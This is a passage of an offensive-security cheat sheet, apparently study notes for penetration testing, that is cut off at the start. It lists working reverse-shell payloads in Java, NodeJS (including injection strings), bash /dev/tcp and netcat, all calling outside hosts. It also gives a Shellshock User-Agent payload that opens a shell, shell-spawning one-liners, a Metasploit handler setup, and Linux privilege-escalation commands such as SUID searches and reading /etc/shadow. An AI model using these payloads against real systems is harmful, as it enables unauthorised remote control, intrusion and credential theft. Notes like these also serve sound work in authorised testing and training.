        String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/1.1.1.1/10086;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        p.waitFor();
    }

}

NODEJS:
--------

/?q=require('child_process').exec('bash+-c+"bash+-i+>%26+/dev/tcp/nc_host/nc_port+0>%261"')

q=require('child_process').exec('/bin/bash')

var net = require('net'),sh = require('child-process').exec('/bin/bash');
var client = new net.Socket();
client.connect(5555,'192.168.1.2',function(){
client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}); 

-------------
NETCAT:
------------

The syntax depends on the netcat package.

netcat-openbsd: nc -l 192.168.2.1 3000

netcat-traditional: nc -l -p 3000 -s 192.168.2.1

direct shell: nc IP PORT -e /bin/sh or -c /bin/sh depends on netcat version 

REVERSE SHELLS:
-----------------

ATTACKBOX: nc -lvp 9000

VICTIM: nc IP PORT -e /bin/sh (LINUX) -e cmd.exe (WINDOWS) 

Simple chat: 
------------
Server: nc -l -p 9000 -s IP

Client: nc IP PORT

File transfer: 
---------------

nc IP PORT < test.txt 

nc -l -s IP > test.txt 

------------
Windows:
------------

Kali Linux contains a nc.exe binary which works stand-alone on Windows. It is located in the following directory:

/usr/share/windows-binaries/nc.exe

--------------------------------
SPAWNING SHELLs:
--------------------------------

from noninteractive to INTERACTIVE shell ->

Lesson learned -> execute generic_tcp_shell -> then upgrade to Meterpreter

Execute generic /bin/sh, then upgrade to /bin/bash

Also SPAWN 1 more shell if accidentally killed, the first one preserve 

BASH:
-----------

awk 'BEGIN {system("/bin/sh")}'

set shell=/bin/bash:shell

PYTHON:
--------

python -c 'import pty; pty.spawn("/bin/sh")'

python -c 'import os; os.system("/bin/bash")'

PERL:
------

perl -e 'exec "/bin/bash"' 

perl -e "system('/bin/bash')" 

VIM:
-----

:!/bin/sh 

:!/bin/bash

RUBY:
-------
RUBY: ruby: exec "/bin/sh"

----------------------------------------------------
METASPLOIT:
----------------------------------------------------

Multihandler:

use exploit/multi/handler 
set LHOST IP
set LPORT IP

sessions -i 3 -name NAME

---------------
BRUTE-FORCE:
---------------

hydra, medusa, patator, metasploit, burpsuite 

----------------
LINUX PRIVEX
----------------

SHELLSHOCK: User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/10.10.14.172/4444 0>&1

password files and its backups or default: /etc/passwd, /etc/shadow
------------------------------------------

old or vulnerable kernel
-------------------------

crontab 
--------

file permissions: 
---------------------

find / -user root -perm -4000 -print 2>/dev/null (SUID binaries) 

find / -perm -0003 -user root 2>/dev/null | egrep -i '(\.py$|\.pl$|\\.exe$) -> owner root, world writeable files

find / -perm -o+w: find world writeable anything  

find suid files: find / -perm -4000 2> /dev/null;  chmod u+s executable

find guid files: find . -perm -2000 2> /dev/null; chmod g+s executable

find sticky files: find / -perm -1000 2> /dev/null

file system - soft, hard links 
---------------------------------

sudo vulnerabilities: sudo -l 
--------------------------------

PATH vulnerabilities 

env vulnerabilities

race conditions 

TIP: https://help.offensive-security.com/hc/en-us/articles/360046869951
------
  
